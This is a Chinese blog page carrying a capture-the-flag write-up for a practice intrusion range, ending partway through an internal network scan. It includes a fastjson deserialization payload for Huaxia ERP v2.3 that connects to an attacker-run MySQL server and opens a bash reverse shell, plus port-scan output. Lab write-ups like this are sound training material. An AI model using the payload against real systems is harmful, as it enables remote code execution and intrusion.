<!DOCTYPE html>
<html lang="zh" dir="auto">

<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>春秋云镜-Exchange-Writeup | Xrntkk&#39;s Blog</title>
<meta name="keywords" content="writeup, 渗透, 春秋云镜">
<meta name="description" content="靶标介绍：
Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。">
<meta name="author" content="Xrntkk">
<link rel="canonical" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/">

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  <meta name="referrer" content="no-referrer-when-downgrade">
<link crossorigin="anonymous" href="/assets/css/stylesheet.e624e7dff45bacc4142784fe89280441dd4670102d43590c5171410d3d0b1877.css" integrity="sha256-5iTn3/RbrMQUJ4T&#43;iSgEQd1GcBAtQ1kMUXFBDT0LGHc=" rel="preload stylesheet" as="style">
<link rel="icon" href="http://localhost:1313/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<link rel="alternate" hreflang="zh" href="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript><link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
<meta name="baidu-site-verification" content="codeva-snmPZ4WZk8" /><meta property="og:url" content="http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/">
  <meta property="og:site_name" content="Xrntkk&#39;s Blog">
  <meta property="og:title" content="春秋云镜-Exchange-Writeup">
  <meta property="og:description" content="靶标介绍：
Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。">
  <meta property="og:locale" content="zh">
  <meta property="og:type" content="article">
    <meta property="article:section" content="post">
    <meta property="article:published_time" content="2025-04-08T23:02:55+08:00">
    <meta property="article:modified_time" content="2025-04-08T23:02:55+08:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="渗透">
    <meta property="article:tag" content="春秋云镜">
      <meta property="og:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://i.postimg.cc/7hwBy7VS/calcr.png">
<meta name="twitter:title" content="春秋云镜-Exchange-Writeup">
<meta name="twitter:description" content="靶标介绍：
Exchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。">


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "http://localhost:1313/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "春秋云镜-Exchange-Writeup",
      "item": "http://localhost:1313/post/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-exchange-writeup/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "春秋云镜-Exchange-Writeup",
  "name": "春秋云镜-Exchange-Writeup",
  "description": "靶标介绍：\nExchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。\n",
  "keywords": [
    "writeup", "渗透", "春秋云镜"
  ],
  "articleBody": "靶标介绍：\nExchange 是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有 4 个 Flag，分布于不同的靶机。 *注意：该靶场只有4个flag，如果提交完4个flag后仍未攻克成功，请关闭环境提交反馈。\nFLAG1 首先用fscan信息收集一手\n1 .\\fscan.exe -h 39.98.127.105 -p 1-65535 2 3 ___ _ 4 / _ \\ ___ ___ _ __ __ _ ___| | __ 5 / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / 6/ /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c 7\\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ 8 fscan version: 1.8.1 9start infoscan 10(icmp) Target 39.98.127.105 is alive 11[*] Icmp alive hosts len is: 1 1239.98.127.105:80 open 1339.98.127.105:22 open 1439.98.127.105:8000 open 15[*] alive ports len is: 3 16start vulscan 17[*] WebTitle:http://39.98.127.105 code:200 len:19813 title:lumia 18[*] WebTitle:http://39.98.127.105:8000 code:302 len:0 title:None 跳转url: http://39.98.127.105:8000/login.html 19[*] WebTitle:http://39.98.127.105:8000/login.html code:200 len:5662 title:Lumia ERP 20已完成 3/3 21[*] 扫描结束,耗时: 5m26.1641278s 80端口是一个介绍产品的网站\n8000端口应该是网站的后台\n看到后台可以注册用户，我们注册一个\n成功进入后台\n华夏ERP v2.3存在一处fastjson反序列化漏洞\nJava 代码审计之华夏 ERP CMS v2.3 - FreeBuf网络安全行业门户\nFastjson版本是 1.2.55\n构造dns请求验证一下\n{\"@type\":\"java.net.Inet4Address\",\"val\":\"ysgbayuskh.iyhc.eu.org\"} 验证漏洞\n这里我们可以通过evil-mysql-server和ysoserial构造恶意mysql服务打jdbc\n./evil-mysql-server -addr 3366 -java java -ysoserial ysoserial-all.jar exp\n{\r\"name\": {\r\"@type\": \"java.lang.AutoCloseable\",\r\"@type\": \"com.mysql.jdbc.JDBC4Connection\",\r\"hostToConnectTo\": \"vpsIP地址\",\r\"portToConnectTo\": 3366,\r\"info\": {\r\"user\": \"yso_CommonsCollections6_bash -c {echo,base64编码后的命令}|{base64,-d}|{bash,-i}\",\r\"password\": \"pass\",\r\"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\",\r\"autoDeserialize\": \"true\",\r\"NUM_HOSTS\": \"1\"\r}\r} 成功弹shell\n有root权限，直接读flag\n1root@iZ8vb6bns5dh59k418a97hZ:/root/flag# cat f* 2cat f* 3 ██ ██ ██ ██ ███████ ███████ ██ ████ ██ ████████ 4░░██ ██ ░██ ████ ██░░░░░██ ░██░░░░██ ████ ░██░██ ░██ ██░░░░░░██ 5 ░░██ ██ ░██ ██░░██ ██ ░░██░██ ░██ ██░░██ ░██░░██ ░██ ██ ░░ 6 ░░███ ░██ ██ ░░██ ░██ ░██░███████ ██ ░░██ ░██ ░░██ ░██░██ 7 ██░██ ░██ ██████████░██ ░██░██░░░██ ██████████░██ ░░██░██░██ █████ 8 ██ ░░██ ░██░██░░░░░░██░░██ ██ ░██ ░░██ ░██░░░░░░██░██ ░░████░░██ ░░░░██ 9 ██ ░░██░██░██ ░██ ░░███████ ░██ ░░██░██ ░██░██ ░░███ ░░████████ 10░░ ░░ ░░ ░░ ░░ ░░░░░░░ ░░ ░░ ░░ ░░ ░░ ░░░ ░░░░░░░░ 11 12 | | || | /~~\\ /\\ |\\ /|~|~ 13 | | ||--|| |/__\\ | \\/ | | 14 \\/ \\/ | | \\__// \\| |_|_ 15 16 flag01: flag{f605c397-0df7-4f55-b013-c7e45be124d0} FLAG2 root@iZ8vb6bns5dh59k418a97hZ:/tmp# ip addr\r1: lo: mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1\rlink/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\rinet 127.0.0.1/8 scope host lo\rvalid_lft forever preferred_lft forever\rinet6 ::1/128 scope host valid_lft forever preferred_lft forever\r2: eth0: mtu 1500 qdisc mq state UP group default qlen 1000\rlink/ether 00:16:3e:1c:80:b4 brd ff:ff:ff:ff:ff:ff\rinet 172.22.3.12/16 brd 172.22.255.255 scope global eth0\rvalid_lft forever preferred_lft forever\rinet6 fe80::216:3eff:fe1c:80b4/64 scope link valid_lft forever preferred_lft forever 传个fscan信息收集一波\n1root@iZ8vb6bns5dh59k418a97hZ:/tmp# ./fscan -h 172.22.3.0/24 -eh 172.22.3.12 -p 1-65535 2┌──────────────────────────────────────────────┐ 3│ ___ _ │ 4│ / _ \\ ___ ___ _ __ __ _ ___| | __ │ 5│ / /_\\/____/ __|/ __| '__/ _` |/ __| |/ / │ 6│ / /_\\\\_____\\__ \\ (__| | | (_| | (__| \u003c │ 7│ \\____/ |___/\\___|_| \\__,_|\\___|_|\\_\\ │ 8└──────────────────────────────────────────────┘ 9 Fscan Version: 2.0.0 10 11[2025-04-09 00:51:47] [INFO] 暴力破解线程数: 1 12[2025-04-09 00:51:47] [INFO] 开始信息扫描 13[2025-04-09 00:51:47] [INFO] CIDR范围: 172.22.3.0-172.22.3.255 14[2025-04-09 00:51:47] [INFO] 生成IP范围: 172.22.3.0.%!d(string=172.22.3.255) - %!s(MISSING).%!d(MISSING) 15[2025-04-09 00:51:47] [INFO] 解析CIDR 172.22.3.0/24 -\u003e IP范围 172.22.3.0-172.22.3.255 16[2025-04-09 00:51:48] [INFO] 已排除指定主机: 1 个 17[2025-04-09 00:51:48] [INFO] 最终有效主机数量: 255 18[2025-04-09 00:51:48] [INFO] 开始主机扫描 19[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.2 存活 (ICMP) 20[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.26 存活 (ICMP) 21[2025-04-09 00:51:48] [SUCCESS] 目标 172.22.3.9 存活 (ICMP) 22[2025-04-09 00:51:51] [INFO] 存活主机数量: 3 23[2025-04-09 00:51:51] [INFO] 有效端口数量: 65535 24[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:25 25[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:53 26[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:80 27[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:88 28[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.9:81 29[2025-04-09 00:51:51] [SUCCESS] 服务识别 172.22.3.9:25 =\u003e [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 30[2025-04-09 00:51:51] [SUCCESS] 端口开放 172.22.3.2:135 31[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:135 32[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:139 33[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.9:139 34[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.2:139 35[2025-04-09 00:51:52] [SUCCESS] 端口开放 172.22.3.26:135 36[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:389 37[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:445 38[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.26:445 39[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:444 40[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.2:445 41[2025-04-09 00:51:55] [SUCCESS] 端口开放 172.22.3.9:443 42[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:465 43[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:464 44[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:477 45[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:476 46[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:475 47[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:465 =\u003e [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 48[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:88 =\u003e 49[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:477 =\u003e [smtp] 50[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:476 =\u003e [smtp] 51[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:475 =\u003e [smtp] 52[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:587 53[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:593 54[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:593 55[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:81 =\u003e [http] 56[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.2:636 57[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:587 =\u003e [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 58[2025-04-09 00:51:56] [SUCCESS] 端口开放 172.22.3.9:717 59[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.2:593 =\u003e [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 60[2025-04-09 00:51:56] [SUCCESS] 服务识别 172.22.3.9:593 =\u003e [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 61[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:636 =\u003e 62[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:808 63[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:890 64[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:717 =\u003e [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 65[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.26:139 =\u003e Banner:[.] 66[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:139 =\u003e Banner:[.] 67[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.2:139 =\u003e Banner:[.] 68[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:1801 69[2025-04-09 00:51:57] [SUCCESS] 服务识别 172.22.3.9:80 =\u003e [http] 版本:10.0 产品:Microsoft IIS httpd 系统:Windows 70[2025-04-09 00:51:57] [SUCCESS] 端口开放 172.22.3.9:2103 71[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2107 72[2025-04-09 00:51:58] [SUCCESS] 端口开放 172.22.3.9:2105 73[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:389 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 74[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:445 =\u003e 75[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.9:2525 76[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.26:445 =\u003e 77[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.9:2525 =\u003e [smtp] 产品:Microsoft Exchange smtpd 系统:Windows 78[2025-04-09 00:52:00] [SUCCESS] 服务识别 172.22.3.2:445 =\u003e 79[2025-04-09 00:52:00] [SUCCESS] 端口开放 172.22.3.2:3268 80[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3269 81[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:3269 =\u003e 82[2025-04-09 00:52:01] [SUCCESS] 服务识别 172.22.3.2:464 =\u003e 83[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.2:3389 84[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.26:3389 85[2025-04-09 00:52:01] [SUCCESS] 端口开放 172.22.3.9:3389 86[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:808 =\u003e 87[2025-04-09 00:52:02] [SUCCESS] 服务识别 172.22.3.9:890 =\u003e 88[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3800 89[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3801 90[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3803 91[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3823 92[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3828 93[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3843 94[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3863 95[2025-04-09 00:52:02] [SUCCESS] 端口开放 172.22.3.9:3867 96[2025-04-09 00:52:03] [SUCCESS] 端口开放 172.22.3.9:3875 97[2025-04-09 00:52:05] [SUCCESS] 服务识别 172.22.3.2:3268 =\u003e [ldap] 产品:Microsoft Windows Active Directory LDAP 系统:Windows 信息:Domain: xiaorang.lab, Site: Default-First-Site-Name 98[2025-04-09 00:52:06] [SUCCESS] 服务识别 172.22.3.26:3389 =\u003e 99[2025-04-09 00:52:06] [SUCCESS] 端口开放 172.22.3.9:5060 100[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5062 101[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:5065 102[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3801 =\u003e 103[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3803 =\u003e 104[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:1801 =\u003e 105[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3823 =\u003e 106[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3828 =\u003e 107[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3843 =\u003e 108[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3863 =\u003e 109[2025-04-09 00:52:07] [SUCCESS] 服务识别 172.22.3.9:3867 =\u003e 110[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6001 111[2025-04-09 00:52:08] [SUCCESS] 服务识别 172.22.3.9:6001 =\u003e [ncacn_http] 版本:1.0 产品:Microsoft Windows RPC over HTTP 系统:Windows Banner:[ncacn_http/1.0] 112[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6027 113[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6049 114[2025-04-09 00:52:07] [SUCCESS] 端口开放 172.22.3.9:6057 115[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6081 116[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6095 117[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6102 118[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6119 119[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6129 120[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6153 121[2025-04-09 00:52:08] [SUCCESS] 端口开放 172.22.3.9:6193 122[2025-04-09 00:52:09] [SUCCESS] 端口开放 172.22.3.9:6228 123[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6401 124[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6405 125[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6400 126[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6404 127[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6430 128[2025-04-09 00:52:11] [SUCCESS] 服务识别 172.22.3.9:5060 =\u003e 129[2025-04-09 00:52:11] [SUCCESS] 端口开放 172.22.3.9:6448 130[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6449 131[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6454 132[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6490 133[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6492 134[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6497 135[2025-04-09 00:52:12] [SUCCESS] 服务识别 172.22.3.9:3800 =\u003e [http] 版本:2.0 产品:Microsoft HTTPAPI httpd 系统:Windows 136[2025-04-09 00:52:12] [SUCCESS] 端口开放 172.22.3.9:6512 137[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6514 138[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6548 139[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6550 140[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6560 141[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6571 142[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6564 143[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6570 144[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6572 145[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6578 146[2025-04-09 00:52:13] [SUCCESS] 端口开放 172.22.3.9:6590 147[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6594 148[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6606 149[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6616 150[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6621 151[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6624 152[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6642 153[2025-04-09 00:52:14] [SUCCESS] 端口开放 172.22.3.9:6664 154[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6685 155[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6690 156[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6719 157[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6728 158[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6741 159[2025-04-09 00:52:15] [SUCCESS] 端口开放 172.22.3.9:6770 160[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5062 =\u003e 161[2025-04-09 00:52:17] [SUCCESS] 服务识别 172.22.3.9:5065 =\u003e 162[2025-04-09 00:52:17] [SUCCESS] 端口开放 172.22.3.9:6772 163[2025-04-09 00:52:18] [SUCCESS] 端口开放 172.22.3.9:7673 164[2025-04-09 00:52:19] [SUCCESS] 服务识别 172.22.3.9:6664 =\u003e 165[2025-04-09 00:52:20] [SUCCESS] 端口开放 172.22.3.9:8172 166[2025-04-09 00:52:51] [SUCCESS] 服务识别 172.22.3.2:53 =\u003e 167[2025-04-09 00:52:52] [SUCCESS] 端口开放 172.22.3.2:9389 168[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2103 =\u003e 169[2025-04-09 00:52:53] [SUCCESS] 端口开放 172.22.3.9:9710 170[2025-04-09 00:52:53] [SUCCESS] 服务识别 172.22.3.9:2107 =\u003e 171[2025-04-09 00:52:55] [SUCCESS] 端口开放 172.22.3.9:12393 172[2025-04-09 00:52:55] [SUCCESS] 服务识别 172.22.3.9:444 =\u003e 173[2025-04-09 00:52:56] [SUCCESS] 服务识别 172.22.3.2:135 =\u003e 174[2025-04-09 00:52:57] [SUCCESS] 端口开放 172.22.3.26:15774 175[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.2:9389 =\u003e 176[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.9:135 =\u003e 177[2025-04-09 00:52:57] [SUCCESS] 服务识别 172.22.3.26:135 =\u003e 178[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:9710 =\u003e 179[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:3875 =\u003e 180[2025-04-09 00:52:58] [SUCCESS] 服务识别 172.22.3.9:2105 =\u003e 181[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6027 =\u003e 182[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6049 =\u003e 183[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6057 =\u003e 184[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6081 =\u003e 185[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6095 =\u003e 186[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6102 =\u003e 187[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6119 =\u003e 188[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6129 =\u003e 189[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6153 =\u003e 190[2025-04-09 00:53:03] [SUCCESS] 服务识别 172.22.3.9:6193 =\u003e 191[2025-04-09 00:53:04] [SUCCESS] 服务识别 172.22.3.9:6228 =\u003e 192[2025-04-09 00:53:05] [SUCCESS] 服务识别 172.22.3.9:12393 =\u003e 193[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6401 =\u003e 194[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6405 =\u003e 195[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6400 =\u003e 196[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.2:3389 =\u003e 197[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6404 =\u003e 198[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:6430 =\u003e 199[2025-04-09 00:53:06] [SUCCESS] 服务识别 172.22.3.9:3389 =\u003e 200[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6448 =\u003e 201[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.26:15774 =\u003e 202[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6449 =\u003e 203[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6454 =\u003e 204[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6490 =\u003e 205[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6492 =\u003e 206[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6497 =\u003e 207[2025-04-09 00:53:07] [SUCCESS] 服务识别 172.22.3.9:6512 =\u003e 208[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6514 =\u003e 209[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6548 =\u003e 210[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6550 =\u003e 211[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6571 =\u003e 212[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6564 =\u003e 213[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6570 =\u003e 214[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6572 =\u003e 215[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6578 =\u003e 216[2025-04-09 00:53:08] [SUCCESS] 服务识别 172.22.3.9:6590 =\u003e 217[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6594 =\u003e 218[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6606 =\u003e 219[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6616 =\u003e 220[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6621 =\u003e 221[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6624 =\u003e 222[2025-04-09 00:53:09] [SUCCESS] 服务识别 172.22.3.9:6642 =\u003e 223[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6685 =\u003e 224[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6690 =\u003e 225[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6719 =\u003e 226[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6728 =\u003e 227[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6741 =\u003e 228[2025-04-09 00:53:10] [SUCCESS] 服务识别 172.22.3.9:6770 =\u003e 229[2025-04-09 00:53:12] 